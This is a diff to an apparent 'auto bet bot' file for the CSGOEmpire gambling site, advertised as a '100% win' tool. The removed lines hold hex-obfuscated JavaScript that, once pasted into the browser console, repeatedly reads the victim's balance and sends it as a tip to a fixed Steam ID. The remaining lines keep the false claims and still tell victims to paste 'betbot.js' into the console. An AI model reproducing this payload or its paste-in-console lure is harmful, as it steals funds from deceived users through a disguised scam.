@@ -1,7 +1,6 @@
-//100% bet bot never lose
-//AUTO BET BOT CSGOEMPIRE 100% WIN
-//press f12 and go to console tab
-//then paste this in the console and press enter
-//it will automatically do the bets for you
-//100% bet accuracy
-var _0xcc1c=["\x2C","\x2E","\x72\x65\x70\x6C\x61\x63\x65","\x74\x65\x78\x74\x43\x6F\x6E\x74\x65\x6E\x74","\x2E\x62\x61\x6C\x61\x6E\x63\x65","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72","\x2F\x61\x70\x69\x2F\x76\x32\x2F\x75\x73\x65\x72\x2F\x63\x68\x61\x74\x2F\x70\x72\x65\x74\x69\x70","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x37\x36\x35\x36\x31\x31\x39\x39\x30\x38\x33\x38\x36\x35\x38\x39\x39","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x73\x65\x6E\x64"];javascript:setInterval(function(){var _0x3ab4x1=document[_0xcc1c[5]](_0xcc1c[4])[_0xcc1c[3]][_0xcc1c[2]](_0xcc1c[0],_0xcc1c[1]);var _0x3ab4x2= new XMLHttpRequest();var _0x3ab4x3=_0xcc1c[6];_0x3ab4x2[_0xcc1c[8]](_0xcc1c[7],_0x3ab4x3,true);var _0x3ab4x4=JSON[_0xcc1c[10]]({"\x73\x74\x65\x61\x6D\x5F\x69\x64":_0xcc1c[9],"\x61\x6D\x6F\x75\x6E\x74":_0x3ab4x1});_0x3ab4x2[_0xcc1c[11]](_0x3ab4x4)},10000);
+100% bet bot never lose
+AUTO BET BOT CSGOEMPIRE 100% WIN
+press f12 and go to console tab
+then paste the text in betbot.js in the console and press enter
+it will automatically do the bets for you
+100% bet accuracy
